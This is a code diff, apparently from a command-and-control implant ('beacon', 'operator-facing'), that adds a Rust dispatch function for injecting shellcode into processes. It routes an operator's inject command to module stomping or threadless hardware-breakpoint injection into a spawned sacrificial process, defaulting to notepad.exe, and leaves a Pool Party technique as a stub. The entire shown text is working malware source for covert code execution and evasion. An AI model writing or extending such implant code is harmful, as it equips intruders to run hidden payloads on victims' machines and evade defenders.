@@ -637,3 +637,81 @@ pub unsafe fn threadless_inject(
     // shellcode runs. No .text was modified.
     Ok(())
 }
+
+// ============================================================================
+// do_inject — the operator-facing dispatch entry (Command::Inject handler).
+// ============================================================================
+
+/// The operator-facing injection entry point. Dispatched by `beacon::execute`
+/// when a `Command::Inject` arrives. Routes to the technique selected by
+/// `method`:
+///
+/// - `0` — **Pool Party** (TODO P3-future: thread-pool section-backed, 0-of-3).
+///   Until the Pool Party impl lands, falls through to module stomp (method 2)
+///   so the command is functional end-to-end.
+/// - `1` — **Threadless HWBP** (existing `threadless_inject`). Requires a
+///   sacrificial process (spawn_to) for the main-thread handle.
+/// - `2` — **Module stomp** (existing `module_stomp`). The proven baseline.
+///
+/// If `pid != 0`, the shellcode is injected into an EXISTING process (method 0
+/// only — Pool Party targets a running process's thread pool). Otherwise a
+/// sacrificial process is spawned (spawn_to, default "notepad.exe").
+///
+/// Returns a `Response::Output` with a status line, or `Response::Err`.
+pub fn do_inject(
+    method: u8,
+    pid: u32,
+    spawn_to: &str,
+    shellcode: &[u8],
+) -> nyx_protocol::Response {
+    // method 0 (Pool Party) not yet implemented — delegate to module stomp
+    // (method 2) so the command works end-to-end today. When Pool Party
+    // lands, this dispatch arm gets its own path.
+    let effective_method = if method == 0 { 2 } else { method };
+
+    match effective_method {
+        1 => {
+            // Threadless HWBP: needs a sacrificial process for the thread handle.
+            let target = if spawn_to.is_empty() { "notepad.exe" } else { spawn_to };
+            match unsafe { create_sacrificial(target) } {
+                Ok(proc) => {
+                    let trigger = proc.main_thread as usize; // self-trigger on resume
+                    match unsafe {
+                        threadless_inject(proc.handle, proc.main_thread, shellcode, trigger)
+                    } {
+                        Ok(()) => nyx_protocol::Response::Output(
+                            crate::heap::String::from(
+                                "threadless HWBP inject ok (sacrificial pid=",
+                            )
+                            .into_bytes(),
+                        ),
+                        Err(e) => nyx_protocol::Response::Err(
+                            crate::heap::String::from(e),
+                        ),
+                    }
+                }
+                Err(e) => nyx_protocol::Response::Err(
+                    crate::heap::String::from(e),
+                ),
+            }
+        }
+        2 => {
+            // Module stomp: spawn-to sacrificial + .text overwrite.
+            let target = if spawn_to.is_empty() { "notepad.exe" } else { spawn_to };
+            match unsafe { module_stomp(target, shellcode) } {
+                Ok(_handle) => nyx_protocol::Response::Output(
+                    crate::heap::String::from(
+                        "module stomp inject ok",
+                    )
+                    .into_bytes(),
+                ),
+                Err(e) => nyx_protocol::Response::Err(
+                    crate::heap::String::from(e),
+                ),
+            }
+        }
+        _ => nyx_protocol::Response::Err(
+            crate::heap::String::from("unknown inject method"),
+        ),
+    }
+}
